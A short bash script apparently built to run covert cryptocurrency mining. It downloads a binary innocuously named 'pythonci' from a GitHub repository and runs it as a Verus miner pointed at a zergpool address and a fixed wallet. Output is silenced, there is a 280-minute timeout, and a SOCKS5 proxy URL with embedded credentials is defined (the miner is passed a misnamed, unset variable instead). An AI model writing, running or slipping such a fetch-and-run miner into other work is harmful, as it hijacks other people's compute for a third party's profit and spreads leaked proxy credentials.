#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://github.com/NRC-TECH/test-files/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
PY=socks5://qwehsyfs:w1uyert4fs@78.46.89.24:45265
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BEDULS)
timeout 280m ./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
echo Sukses
